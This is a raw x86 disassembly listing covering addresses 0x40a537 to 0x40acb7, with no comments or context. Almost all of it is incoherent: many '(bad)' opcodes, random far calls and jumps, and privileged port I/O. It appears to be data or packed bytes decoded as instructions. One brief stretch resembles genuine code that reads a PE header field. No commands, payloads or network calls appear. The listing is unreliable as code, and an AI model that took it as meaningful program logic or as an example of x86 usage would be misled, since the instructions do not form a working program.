  40a537:	push   edx
  40a538:	int    0xac
  40a53a:	ja     0x40a529
  40a53c:	mov    WORD PTR [edx-0x7c],?
  40a53f:	mov    al,ds:0x6a179ce
  40a544:	pop    edx
  40a545:	sub    eax,0xe42f01e1
  40a54a:	fdivrp st(7),st
  40a54c:	stos   DWORD PTR es:[edi],eax
  40a54d:	mov    WORD PTR [eax-0x72e10a53],es
  40a553:	lods   eax,DWORD PTR ds:[esi]
  40a554:	(bad)  
  40a555:	jae    0x40a556
  40a557:	pop    ebx
  40a558:	inc    esp
  40a559:	jle    0x40a4e5
  40a55b:	mov    edx,0xc79b78ef
  40a560:	sbb    dl,0x44
  40a563:	adc    DWORD PTR [edx],0x7d3c2710
  40a569:	sbb    eax,0x7522780
  40a56e:	test   eax,0x70e5212b
  40a573:	mov    dh,0x15
  40a575:	sub    BYTE PTR [eax-0x24],al
  40a578:	repnz add BYTE PTR [ebx],ah
  40a57b:	inc    edi
  40a57c:	leave  
  40a57d:	sub    bh,ch
  40a57f:	cs mov ah,0x3c
  40a582:	push   cs
  40a583:	lock adc edx,DWORD PTR [ecx+ebx*2+0x2d]
  40a588:	aad    0xd
  40a58a:	cld    
  40a58b:	test   DWORD PTR [esi+0x4bed65a8],ebp
  40a591:	ret    0x3042
  40a594:	mov    bl,0xaf
  40a596:	dec    edi
  40a597:	sub    BYTE PTR [ebp-0x68],dh
  40a59a:	pusha  
  40a59b:	fadd   st(5),st
  40a59d:	jp     0x40a5b0
  40a59f:	sub    BYTE PTR [edx+0x57dfa02f],ah
  40a5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a6:	hlt    
  40a5a7:	pop    edx
  40a5a8:	ficom  DWORD PTR [ecx]
  40a5aa:	pop    edx
  40a5ab:	call   0x7d24:0xdacfefd4
  40a5b2:	adc    ecx,DWORD PTR [ebp-0x45]
  40a5b5:	cs loope 0x40a5d3
  40a5b8:	test   eax,0x5c3ff18c
  40a5bd:	add    BYTE PTR [edi-0x62241ac6],cl
  40a5c3:	push   esi
  40a5c4:	loopne 0x40a5f1
  40a5c6:	or     esp,eax
  40a5c8:	mov    ds:0xb0c2a87c,eax
  40a5cd:	sub    cl,BYTE PTR [esi+0xcfe5544]
  40a5d3:	fldenv [edx-0xfcbcac7]
  40a5d9:	xor    ecx,DWORD PTR [ecx+edi*4+0x69dd4f68]
  40a5e0:	clc    
  40a5e1:	push   eax
  40a5e2:	retf   
  40a5e3:	push   eax
  40a5e4:	or     ah,BYTE PTR [eax+0x6fef8da0]
  40a5ea:	call   0x59fce054
  40a5ef:	xchg   DWORD PTR [esi+0x3f7391bc],edi
  40a5f5:	jae    0x40a5a9
  40a5f7:	mov    fs,WORD PTR [ebp-0x230b73d2]
  40a5fd:	mov    eax,ds:0x98972b10
  40a602:	add    DWORD PTR [edi+ebx*2-0x2],ecx
  40a606:	pop    eax
  40a607:	xor    DWORD PTR [esi],eax
  40a609:	nop
  40a60a:	sub    eax,0x3105e745
  40a60f:	lock dec DWORD PTR [esi+ebp*1+0x11]
  40a614:	xchg   ebx,eax
  40a615:	imul   ebp,DWORD PTR [ebx-0x7e00c621],0x7a
  40a61c:	adc    al,0xd3
  40a61e:	pop    ds
  40a61f:	ins    BYTE PTR es:[edi],dx
  40a620:	inc    eax
  40a621:	cli    
  40a622:	xor    DWORD PTR [eax],0xffffff98
  40a625:	inc    ecx
  40a626:	xchg   bl,cl
  40a628:	xchg   esi,eax
  40a629:	mov    bl,0xf5
  40a62b:	out    0x9a,al
  40a62d:	es leave 
  40a62f:	inc    ebp
  40a630:	cmp    esp,DWORD PTR [eax+0x6cbb3a7c]
  40a636:	xchg   ebp,eax
  40a637:	ins    DWORD PTR es:[edi],dx
  40a638:	shr    DWORD PTR [esi],1
  40a63a:	cld    
  40a63b:	mov    al,0x65
  40a63d:	inc    edx
  40a63e:	dec    ecx
  40a63f:	xlat   BYTE PTR ds:[ebx]
  40a640:	rol    DWORD PTR [ebx],1
  40a642:	mov    ebx,0x7dd5d94b
  40a647:	int    0x85
  40a649:	cmp    al,0xf5
  40a64b:	leave  
  40a64c:	push   esp
  40a64d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a64e:	repz fnstcw WORD PTR [eax-0x73bdc2eb]
  40a655:	and    al,0x4e
  40a657:	add    al,0x9
  40a659:	repz and al,BYTE PTR [esi+0x4174c727]
  40a660:	mov    al,0x83
  40a662:	mov    bl,BYTE PTR [ebx]
  40a664:	cmc    
  40a665:	or     bl,BYTE PTR [edx-0x7e]
  40a668:	and    eax,edi
  40a66a:	sbb    esi,DWORD PTR [edi+ecx*1+0x62e29fad]
  40a671:	jne    0x40a6ef
  40a673:	mov    ds:0x5deb0e3d,al
  40a678:	das    
  40a679:	inc    edi
  40a67a:	cmp    eax,0x981c354c
  40a67f:	push   esp
  40a680:	jbe    0x40a6c1
  40a682:	aas    
  40a683:	jmp    0x4bde:0xc61e2e93
  40a68a:	fisub  WORD PTR [edi+0x4e69e8fe]
  40a690:	mov    WORD PTR [eax-0x1f929207],?
  40a696:	outs   dx,BYTE PTR fs:[esi]
  40a698:	pop    ss
  40a699:	pop    ds
  40a69a:	sbb    al,BYTE PTR [esi]
  40a69c:	sub    al,0x15
  40a69e:	push   0xffffff93
  40a6a0:	aam    0x71
  40a6a2:	scas   al,BYTE PTR es:[edi]
  40a6a3:	ja     0x40a71b
  40a6a5:	das    
  40a6a6:	call   0xb2e153b3
  40a6ab:	(bad)  
  40a6ac:	xor    DWORD PTR [edx+0x100df997],ebx
  40a6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6b3:	(bad)  
  40a6b4:	sbb    al,0xe2
  40a6b6:	and    BYTE PTR [edx-0x295b7d4c],al
  40a6bc:	jmp    0x40a6fe
  40a6be:	lock sub BYTE PTR [edx+ecx*4-0x8bada1f],al
  40a6c6:	js     0x40a6b7
  40a6c8:	xlat   BYTE PTR ds:[ebx]
  40a6c9:	or     bh,BYTE PTR [ecx+0x51]
  40a6cc:	or     DWORD PTR [edx+edi*4+0x79],esi
  40a6d0:	cdq    
  40a6d1:	call   DWORD PTR [esi+0x18be9d93]
  40a6d7:	cdq    
  40a6d8:	jb     0x40a67d
  40a6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6db:	add    eax,edi
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x63]
  40a6ef:	enter  0x4a08,0x78
  40a6f3:	jmp    0x7dbb2576
  40a6f8:	jle    0x40a778
  40a6fa:	jmp    0x88f68952
  40a6ff:	lahf   
  40a700:	dec    edi
  40a701:	shl    BYTE PTR [esi+0x65],1
  40a704:	stos   DWORD PTR es:[edi],eax
  40a705:	and    ah,ch
  40a707:	mov    edi,0x48620766
  40a70c:	pop    ecx
  40a70d:	loopne 0x40a705
  40a70f:	fiadd  DWORD PTR [ecx-0x40]
  40a712:	add    eax,0x6ece0689
  40a717:	mov    ebx,0x2a4c3da6
  40a71c:	mov    edx,0x1be4b883
  40a721:	mov    edx,0x1ccb1c4b
  40a726:	mov    ds:0xcaa1674e,al
  40a72b:	ds jp  0x40a706
  40a72e:	inc    esi
  40a72f:	jnp    0x40a7a4
  40a731:	rcr    BYTE PTR [edx-0x14c6082a],0xba
  40a738:	pop    ebx
  40a739:	stos   DWORD PTR es:[edi],eax
  40a73a:	and    bl,al
  40a73c:	cdq    
  40a73d:	cmp    dl,BYTE PTR [edx+0x75]
  40a740:	test   BYTE PTR [eax],cl
  40a742:	jb     0x40a772
  40a744:	(bad)  
  40a745:	sbb    al,0xbe
  40a747:	adc    eax,0xe181fa6
  40a74c:	retf   0xc216
  40a74f:	xor    edx,0xffffffa9
  40a752:	outs   dx,DWORD PTR ds:[esi]
  40a753:	xor    DWORD PTR [edx+0x340879a4],esp
  40a759:	stos   BYTE PTR es:[edi],al
  40a75a:	adc    edi,DWORD PTR [eax]
  40a75c:	(bad)  
  40a75d:	cld    
  40a75e:	(bad)  
  40a760:	stos   DWORD PTR es:[edi],eax
  40a761:	adc    DWORD PTR [ebx-0xa6d14e4],0x97501a16
  40a76b:	test   al,0xe5
  40a76d:	pop    ecx
  40a76e:	(bad)  
  40a76f:	adc    dh,BYTE PTR [ecx]
  40a771:	pop    esp
  40a772:	dec    ecx
  40a773:	das    
  40a774:	pop    esp
  40a775:	lods   eax,DWORD PTR ds:[esi]
  40a776:	xor    al,0xb4
  40a778:	adc    al,0x7a
  40a77a:	ret    
  40a77b:	jle    0x40a7a3
  40a77d:	rol    DWORD PTR [ebp-0x72],cl
  40a780:	rol    BYTE PTR [edx],1
  40a782:	mov    dl,0x2d
  40a784:	cmp    bl,dl
  40a786:	mov    al,0x6f
  40a788:	icebp  
  40a789:	mov    eax,ds:0x83acd45a
  40a78e:	les    esp,FWORD PTR [ecx+eiz*4-0x57]
  40a792:	int3   
  40a793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a794:	push   cs
  40a795:	inc    ebp
  40a796:	mov    al,BYTE PTR [edi-0x1aff1b1d]
  40a79c:	adc    eax,0x462ec6ea
  40a7a1:	(bad)  
  40a7a2:	(bad)  
  40a7a3:	xchg   esp,eax
  40a7a4:	add    ebp,0x2a
  40a7a7:	push   ecx
  40a7a8:	lock ficom DWORD PTR [ebp-0x76]
  40a7ac:	sub    al,0x3e
  40a7ae:	inc    edx
  40a7af:	sbb    BYTE PTR [eax-0x55f25631],0xc2
  40a7b6:	fnstsw WORD PTR [ebx-0x22b59698]
  40a7bc:	scas   al,BYTE PTR es:[edi]
  40a7bd:	xor    eax,0x55962589
  40a7c2:	jno    0x40a7d6
  40a7c4:	mov    eax,ds:0xc049b189
  40a7c9:	pusha  
  40a7ca:	jl     0x40a7ff
  40a7cc:	xchg   esi,eax
  40a7cd:	fwait
  40a7ce:	out    0xda,eax
  40a7d0:	add    eax,0xd37af43c
  40a7d5:	pop    ecx
  40a7d6:	mov    edx,DWORD PTR [ebp+ebp*4-0x73e98bf4]
  40a7dd:	icebp  
  40a7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7df:	es inc eax
  40a7e1:	mov    al,0x4d
  40a7e3:	and    edi,DWORD PTR [edx]
  40a7e5:	cmp    cl,bl
  40a7e7:	add    ah,BYTE PTR [eax+0x2e53536e]
  40a7ed:	jp     0x40a805
  40a7ef:	xor    eax,0x28a88c65
  40a7f4:	pop    edx
  40a7f5:	and    ch,BYTE PTR [esi-0x52]
  40a7f8:	(bad)  
  40a7f9:	je     0x40a823
  40a7fb:	or     al,0xca
  40a7fd:	icebp  
  40a7fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ff:	adc    al,0x90
  40a801:	dec    esi
  40a802:	loop   0x40a7f7
  40a804:	sti    
  40a805:	addr16 (bad) 
  40a808:	or     BYTE PTR [eax],bh
  40a80a:	ficom  DWORD PTR [esi-0x80]
  40a80d:	pop    ss
  40a80e:	pop    ebp
  40a80f:	pop    esp
  40a810:	xchg   ebx,eax
  40a811:	pop    eax
  40a812:	adc    edx,DWORD PTR [edi-0x6d]
  40a815:	adc    edi,DWORD PTR [ebp+0x43edd3ac]
  40a81b:	and    ah,BYTE PTR [edx+0x4e1721af]
  40a821:	pop    edi
  40a822:	fwait
  40a823:	cmp    al,0x89
  40a825:	sti    
  40a826:	pop    esi
  40a827:	and    eax,0xd2158034
  40a82c:	jnp    0x40a826
  40a82e:	pop    ss
  40a82f:	xchg   edi,eax
  40a830:	test   eax,0xcfaf64fe
  40a835:	add    ebp,ebp
  40a837:	pushf  
  40a838:	xor    BYTE PTR [ecx+0x67],ch
  40a83b:	mov    ah,BYTE PTR [esi+0x79fbf4cd]
  40a841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a842:	pop    ebx
  40a843:	dec    eax
  40a844:	mov    ds:0x3b1fc3fd,eax
  40a849:	in     eax,0x43
  40a84b:	xor    ebp,edx
  40a84d:	out    0x7d,eax
  40a84f:	and    BYTE PTR [eax+0x78],dh
  40a852:	sbb    BYTE PTR ds:0x60ec3621,al
  40a858:	push   eax
  40a859:	inc    ebx
  40a85a:	stos   DWORD PTR es:[edi],eax
  40a85b:	jmp    0x3fa8:0xa15dd9b4
  40a862:	aam    0xa1
  40a864:	xor    al,0x75
  40a866:	cmp    DWORD PTR [esi+0x533f2171],esp
  40a86c:	or     al,0xa3
  40a86e:	in     eax,dx
  40a86f:	sub    BYTE PTR [esp+edi*1-0x6d3998a3],0x5e
  40a877:	and    edx,0xc59cfa40
  40a87d:	mov    edx,0x258edddb
  40a882:	enter  0x3ae1,0xfa
  40a886:	fist   DWORD PTR [eax-0x7c]
  40a889:	loopne 0x40a8a1
  40a88b:	dec    ebx
  40a88c:	(bad)  
  40a88d:	mov    edi,0xf2cbd60b
  40a892:	popf   
  40a893:	in     eax,dx
  40a894:	cli    
  40a895:	cmp    DWORD PTR [ebx-0x344f43a2],edx
  40a89b:	jbe    0x40a915
  40a89d:	cwde   
  40a89e:	mov    ch,0x14
  40a8a0:	arpl   bp,cx
  40a8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a3:	pop    ebp
  40a8a4:	pop    ecx
  40a8a5:	mov    ds:0x482becf,al
  40a8aa:	pushf  
  40a8ab:	push   es
  40a8ac:	dec    ebp
  40a8ad:	arpl   cx,ax
  40a8af:	out    0x2c,al
  40a8b1:	cli    
  40a8b2:	or     dh,BYTE PTR [edx+0xe]
  40a8b5:	repnz inc esi
  40a8b7:	xchg   ecx,eax
  40a8b8:	inc    esi
  40a8b9:	jecxz  0x40a86f
  40a8bb:	call   0x9e78:0x7d656af2
  40a8c2:	std    
  40a8c3:	fwait
  40a8c4:	aas    
  40a8c5:	xor    esi,DWORD PTR [ebx+0x7ea92e44]
  40a8cb:	xor    DWORD PTR [eax],0xffffffa5
  40a8ce:	retf   
  40a8cf:	pop    ebp
  40a8d0:	popa   
  40a8d1:	lods   al,BYTE PTR ds:[esi]
  40a8d2:	and    ch,dh
  40a8d4:	cmp    eax,0xfe01bf3e
  40a8d9:	jbe    0x40a912
  40a8db:	mov    bh,cl
  40a8dd:	jge    0x40a8bb
  40a8df:	leave  
  40a8e0:	sbb    ebp,edi
  40a8e2:	mov    bl,0x5e
  40a8e4:	dec    edx
  40a8e5:	pusha  
  40a8e6:	push   ss
  40a8e7:	ins    BYTE PTR es:[edi],dx
  40a8e8:	push   edi
  40a8e9:	mov    edi,0xc2366a7
  40a8ee:	dec    ecx
  40a8ef:	imul   ecx,DWORD PTR [edx-0x69fdee14],0x9a22de65
  40a8f9:	scas   al,BYTE PTR es:[edi]
  40a8fa:	(bad)  
  40a8fb:	fisub  WORD PTR [eax]
  40a8fd:	(bad)  [eax-0x79]
  40a900:	and    al,0x2e
  40a902:	call   0xd41c2f69
  40a907:	js     0x40a930
  40a909:	jb     0x40a8ae
  40a90b:	jnp    0x40a91b
  40a90d:	cs dec esi
  40a90f:	jnp    0x40a95c
  40a911:	call   0x820cbbc1
  40a916:	mov    ebp,0xd97cdeff
  40a91b:	xchg   ecx,eax
  40a91c:	lods   eax,DWORD PTR ds:[esi]
  40a91d:	inc    eax
  40a91e:	sub    BYTE PTR [ecx-0x609b11d8],al
  40a924:	and    al,0xb8
  40a926:	aam    0x9b
  40a928:	xchg   ecx,eax
  40a929:	stos   BYTE PTR es:[edi],al
  40a92a:	sahf   
  40a92b:	jg     0x40a97e
  40a92d:	xchg   esi,eax
  40a92e:	int3   
  40a92f:	int3   
  40a930:	sbb    BYTE PTR [eax+0x3e],dl
  40a933:	ret    0x9427
  40a936:	ss push ebp
  40a938:	out    dx,eax
  40a939:	add    esi,DWORD PTR [edx+eax*2-0x595e185d]
  40a940:	sub    al,0xbf
  40a942:	aam    0x3e
  40a944:	jp     0x40a9c3
  40a946:	mov    edi,eax
  40a948:	sti    
  40a949:	cli    
  40a94a:	pop    ds
  40a94b:	mov    ah,0x7a
  40a94d:	mov    eax,0xda537301
  40a952:	xlat   BYTE PTR ds:[ebx]
  40a953:	ror    BYTE PTR [edi+edx*1-0x1d],1
  40a957:	mov    ch,0xb2
  40a959:	xchg   BYTE PTR [esi],al
  40a95b:	rcl    DWORD PTR [ecx-0x44],0x8
  40a95f:	dec    esi
  40a960:	call   0xc1bf82c
  40a965:	xchg   edi,eax
  40a966:	sub    eax,0xb7f64866
  40a96b:	dec    ebx
  40a96c:	popa   
  40a96d:	loope  0x40a9a2
  40a96f:	je     0x40a934
  40a971:	and    esi,DWORD PTR [esi-0x5f6f4727]
  40a977:	or     BYTE PTR [ecx+edi*2+0x4],cl
  40a97b:	into   
  40a97c:	and    dl,BYTE PTR [ecx]
  40a97e:	loopne 0x40a9d4
  40a980:	scas   eax,DWORD PTR es:[edi]
  40a981:	or     BYTE PTR ds:0xa0d5ef0f,al
  40a987:	(bad)  
  40a988:	fsubr  QWORD PTR [edi-0x1397eebe]
  40a98e:	in     al,0xd4
  40a990:	clc    
  40a991:	dec    esp
  40a992:	and    esi,ebx
  40a994:	daa    
  40a995:	stc    
  40a996:	pushf  
  40a997:	or     DWORD PTR [ebx-0x10dc8e18],ecx
  40a99d:	mov    BYTE PTR [ebp-0x80],bh
  40a9a0:	and    bl,BYTE PTR [ecx]
  40a9a2:	nop
  40a9a3:	add    ebp,ebx
  40a9a5:	aaa    
  40a9a6:	(bad)  
  40a9a7:	mov    eax,0xc334059d
  40a9ac:	sub    al,0x5f
  40a9ae:	jns    0x40aa0f
  40a9b0:	mul    BYTE PTR [ebx+0x26]
  40a9b3:	and    al,0x94
  40a9b5:	jb     0x40a9b5
  40a9b7:	xchg   DWORD PTR [ecx+edx*2],edi
  40a9ba:	lods   al,BYTE PTR ds:[esi]
  40a9bb:	das    
  40a9bc:	dec    edi
  40a9bd:	jmp    0x51d99849
  40a9c2:	xlat   BYTE PTR ds:[ebx]
  40a9c3:	cvttps2pi mm0,xmm3
  40a9c6:	repz or ebx,ebp
  40a9c9:	ret    0x750c
  40a9cc:	xor    esi,DWORD PTR [esi+0x16ec39]
  40a9d2:	stos   DWORD PTR es:[edi],eax
  40a9d3:	adc    al,0x1
  40a9d5:	push   ecx
  40a9d6:	shl    ebp,0x75
  40a9d9:	mov    edx,DWORD PTR [ecx-0x21b32f7d]
  40a9df:	mov    ah,0x30
  40a9e1:	jge    0x40a9e9
  40a9e3:	dec    edx
  40a9e4:	rcl    BYTE PTR [ebp+0x31],0x40
  40a9e8:	xchg   esp,eax
  40a9e9:	out    dx,al
  40a9ea:	fdivr  DWORD PTR [ebp-0x52b1eb29]
  40a9f0:	pushf  
  40a9f1:	hlt    
  40a9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f3:	dec    esp
  40a9f4:	sub    al,0x22
  40a9f6:	xlat   BYTE PTR ds:[ebx]
  40a9f7:	into   
  40a9f8:	iret   
  40a9f9:	push   0xffffffde
  40a9fb:	outs   dx,DWORD PTR ds:[esi]
  40a9fc:	mov    bh,0x8
  40a9fe:	cmp    DWORD PTR [ecx],eax
  40aa00:	je     0x40ba28
  40aa06:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa09:	mov    eax,DWORD PTR [ebp-0x8]
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [eax+eax*2-0xbfb7911],esp
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	dec    edi
  40aa36:	mov    ebx,0x784acb6e
  40aa3b:	sub    dh,bh
  40aa3d:	xor    dl,BYTE PTR [ebx+0x61]
  40aa40:	inc    edx
  40aa41:	(bad)  
  40aa42:	ret    0x2c0a
  40aa45:	cmp    eax,0xfca85cc2
  40aa4a:	lods   al,BYTE PTR ds:[esi]
  40aa4b:	cmp    eax,0x97f7dfdc
  40aa50:	sbb    dl,BYTE PTR [eax-0x1c209000]
  40aa56:	or     al,0x34
  40aa59:	leave  
  40aa5a:	popa   
  40aa5b:	xlat   BYTE PTR ds:[ebx]
  40aa5c:	les    ecx,FWORD PTR [edi]
  40aa5e:	inc    ebx
  40aa5f:	jns    0x40a9ea
  40aa61:	dec    ebp
  40aa62:	call   0x31c9:0xc5b0d6da
  40aa69:	sbb    esi,edi
  40aa6b:	fnstenv [eax+0x4368dcd1]
  40aa71:	aad    0x67
  40aa73:	clc    
  40aa74:	xchg   esp,eax
  40aa75:	xor    eax,0x8905f9e9
  40aa7a:	hlt    
  40aa7b:	ins    DWORD PTR es:[edi],dx
  40aa7c:	push   cs
  40aa7d:	repnz into 
  40aa7f:	jl     0x40aa06
  40aa81:	call   0xa78b:0x7fc22d0f
  40aa88:	je     0x40aac8
  40aa8a:	sbb    ebx,DWORD PTR [eax]
  40aa8c:	popa   
  40aa8d:	jnp    0x40aac6
  40aa8f:	push   ebp
  40aa90:	fsub   st(2),st
  40aa92:	xchg   BYTE PTR [ebx+0x65],bl
  40aa95:	dec    ebp
  40aa96:	rcl    ah,0x36
  40aa99:	mov    ds:0xbe22477f,al
  40aa9e:	add    BYTE PTR [esi],bl
  40aaa0:	cli    
  40aaa1:	adc    eax,0x7d1a0d60
  40aaa6:	std    
  40aaa7:	shl    dl,cl
  40aaa9:	shr    DWORD PTR [ebx-0x34],0xc7
  40aaad:	lock retf 
  40aaaf:	jg     0x40aa9d
  40aab1:	int3   
  40aab2:	rcl    DWORD PTR [esi],1
  40aab4:	enter  0x61de,0x7f
  40aab8:	push   0xdc18c917
  40aabd:	and    ebx,edx
  40aabf:	xor    bh,0xfd
  40aac2:	mov    ebx,0x4de99022
  40aac7:	cwde   
  40aac8:	(bad)  
  40aac9:	adc    BYTE PTR [ecx-0x7ad01f6f],ch
  40aacf:	std    
  40aad0:	mov    esi,0xa118aa98
  40aad5:	fldenv [edx+0xd]
  40aad8:	sbb    edx,esp
  40aada:	xchg   esi,eax
  40aadb:	das    
  40aadc:	jle    0x40ab48
  40aade:	inc    edi
  40aadf:	int3   
  40aae0:	lods   al,BYTE PTR ds:[esi]
  40aae1:	and    al,0x26
  40aae3:	pop    eax
  40aae4:	cmc    
  40aae5:	cmp    ebx,DWORD PTR ds:[esi+ebp*1]
  40aae9:	add    dl,al
  40aaeb:	mov    edi,0x4212e767
  40aaf0:	inc    esp
  40aaf1:	dec    ecx
  40aaf2:	js     0x40ab0d
  40aaf4:	inc    ebp
  40aaf5:	add    eax,0x2a
  40aaf8:	shl    DWORD PTR [eax-0xb6fd84],1
  40aafe:	int    0x37
  40ab00:	sub    bh,BYTE PTR [esi+0x35d39d95]
  40ab06:	imul   eax,DWORD PTR [esi+0x4af0be91],0xe5fe02b1
  40ab10:	ror    DWORD PTR [ecx+eax*4+0x10],cl
  40ab14:	popf   
  40ab15:	xor    BYTE PTR [ecx],dh
  40ab17:	fmul   QWORD PTR [eax-0x36]
  40ab1a:	xchg   BYTE PTR [ebp+0x133b306e],bl
  40ab20:	inc    ecx
  40ab21:	ja     0x40ab5c
  40ab23:	call   0x4b6bdca1
  40ab28:	mov    edx,0xca4ad521
  40ab2d:	je     0x40aaff
  40ab2f:	jp     0x40ab2e
  40ab31:	test   dh,bl
  40ab33:	aad    0xc3
  40ab35:	pop    ds
  40ab36:	in     eax,0x47
  40ab38:	iret   
  40ab39:	ins    BYTE PTR es:[edi],dx
  40ab3a:	push   ebp
  40ab3b:	push   eax
  40ab3c:	loopne 0x40ab97
  40ab3e:	stos   DWORD PTR es:[edi],eax
  40ab3f:	push   ss
  40ab40:	clc    
  40ab41:	fcomp  QWORD PTR [ebp+ebx*4-0x68]
  40ab45:	lahf   
  40ab46:	fs out 0x74,eax
  40ab49:	jmp    0x8522bdbe
  40ab4e:	dec    esp
  40ab4f:	push   0xee97138d
  40ab54:	xchg   BYTE PTR [ebp-0x5f],al
  40ab57:	lock test eax,0xcdf15c95
  40ab5d:	add    esp,DWORD PTR [edi+0x46]
  40ab60:	or     ah,BYTE PTR [edx-0x3007a4b4]
  40ab66:	aam    0x38
  40ab68:	dec    eax
  40ab69:	jo     0x40ab42
  40ab6b:	sub    BYTE PTR [esi-0x6b],bl
  40ab6e:	pop    ds
  40ab6f:	mov    ecx,0xaad00e55
  40ab74:	mov    bl,0x33
  40ab76:	fwait
  40ab77:	aam    0x5b
  40ab79:	jmp    0x40ab06
  40ab7b:	cmp    BYTE PTR [ecx-0x5],ah
  40ab7e:	repnz mov ecx,0xb838b513
  40ab84:	sbb    eax,0x1dfd292d
  40ab89:	(bad)  [eax+0x75]
  40ab8c:	pop    ebp
  40ab8d:	adc    ch,ah
  40ab8f:	and    BYTE PTR [edx-0x57],bl
  40ab92:	dec    ebp
  40ab93:	cwde   
  40ab94:	not    ecx
  40ab96:	sbb    bh,dl
  40ab98:	addr16 mov esp,0xfaa0d851
  40ab9e:	jne    0x40ac05
  40aba0:	jo     0x40ab9a
  40aba2:	and    DWORD PTR [eax-0x6de26fc9],ecx
  40aba8:	jb     0x40ab77
  40abaa:	call   0xea20:0x74497354
  40abb1:	inc    edx
  40abb2:	(bad)  
  40abb3:	xlat   BYTE PTR ds:[ebx]
  40abb4:	inc    ecx
  40abb5:	push   edi
  40abb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb7:	push   ecx
  40abb8:	mov    bh,0x4d
  40abba:	daa    
  40abbb:	dec    ecx
  40abbc:	xor    eax,0x99d50835
  40abc1:	shr    BYTE PTR [ecx],cl
  40abc3:	mov    ah,BYTE PTR ds:[edi+0x54]
  40abc7:	pop    ds
  40abc8:	in     al,dx
  40abc9:	daa    
  40abca:	xlat   BYTE PTR ds:[ebx]
  40abcb:	scas   al,BYTE PTR es:[edi]
  40abcc:	cmp    DWORD PTR [ecx+0x24e16875],ecx
  40abd2:	jbe    0x40ab69
  40abd4:	loope  0x40abe3
  40abd6:	cld    
  40abd7:	mov    WORD PTR [ebx-0x399596b0],ss
  40abdd:	fistp  WORD PTR [edi+0x719f2a0d]
  40abe3:	imul   DWORD PTR [ebx-0x629bd25e]
  40abe9:	cdq    
  40abea:	iret   
  40abeb:	cld    
  40abec:	mov    DWORD PTR cs:[eax-0x5ebb8654],edx
  40abf3:	xchg   BYTE PTR [ebp+0x1d],al
  40abf6:	xchg   edx,eax
  40abf7:	adc    DWORD PTR [eax+0x62],edx
  40abfa:	inc    eax
  40abfb:	xchg   edx,eax
  40abfc:	dec    edi
  40abfd:	rol    DWORD PTR [ebp+0x47786b7d],1
  40ac03:	cli    
  40ac04:	sar    DWORD PTR [esi-0x47],cl
  40ac07:	(bad)  
  40ac08:	in     eax,dx
  40ac09:	sbb    ebx,edx
  40ac0b:	jo     0x40abb4
  40ac0d:	dec    ebp
  40ac0e:	test   eax,0xe3c10b46
  40ac13:	jl     0x40abf3
  40ac15:	cmp    bh,BYTE PTR ds:0xc220652e
  40ac1b:	test   BYTE PTR [edi+0xb],al
  40ac1e:	ja     0x40ac7a
  40ac20:	cmp    eax,0xf2b5d80c
  40ac25:	(bad)  
  40ac26:	add    DWORD PTR es:0x970f81d0,0x4
  40ac2e:	sub    DWORD PTR [esi],ebx
  40ac30:	pushf  
  40ac31:	xor    BYTE PTR [esi+0x7e9c640d],0x9a
  40ac38:	mov    cl,0xc7
  40ac3a:	lahf   
  40ac3b:	aad    0x10
  40ac3d:	mul    BYTE PTR [edx]
  40ac3f:	(bad)  
  40ac40:	xchg   edi,eax
  40ac41:	ins    BYTE PTR es:[edi],dx
  40ac42:	adc    ecx,DWORD PTR [ecx]
  40ac44:	and    eax,0xf695274c
  40ac49:	and    al,0x14
  40ac4b:	lods   eax,DWORD PTR ds:[esi]
  40ac4c:	mov    DWORD PTR [ebp-0x6e],0x7933c707
  40ac53:	test   BYTE PTR [ecx-0x389e1c9b],0x2b
  40ac5a:	push   edx
  40ac5b:	adc    BYTE PTR ds:0x13a0a378,0x7
  40ac62:	cld    
  40ac63:	out    dx,eax
  40ac64:	fnstsw WORD PTR [di]
  40ac67:	sub    bl,BYTE PTR [ecx-0x7f7181f5]
  40ac6d:	imul   edx,ebx,0x50
  40ac70:	scas   eax,DWORD PTR es:[edi]
  40ac71:	jmp    0xb245e916
  40ac76:	test   al,0x34
  40ac78:	cmp    al,0xdc
  40ac7a:	pushw  ss
  40ac7c:	les    ecx,FWORD PTR [ebx]
  40ac7e:	sahf   
  40ac7f:	(bad)  
  40ac80:	jp     0x40ac95
  40ac82:	rcl    DWORD PTR [esi-0x26d276e9],0x60
  40ac89:	test   DWORD PTR [ebp-0x1a],edx
  40ac8c:	xchg   edi,eax
  40ac8d:	(bad)  
  40ac8e:	cmp    DWORD PTR [ebp+0x7b],esi
  40ac91:	fs xchg ecx,eax
  40ac93:	pop    esp
  40ac94:	cld    
  40ac95:	out    dx,al
  40ac96:	shr    BYTE PTR ds:0x510805f3,cl
  40ac9c:	jnp    0x40ad01
  40ac9e:	ds and ah,dh
  40aca1:	test   DWORD PTR [esi+0xdca422b],edx
  40aca7:	sub    eax,0x2ebbf63a
  40acac:	ins    DWORD PTR es:[edi],dx
  40acad:	clc    
  40acae:	int3   
  40acaf:	fcom   DWORD PTR [esi+0x7909ac1f]
  40acb5:	js     0x40accf
  40acb7:	mov    cs,ecx
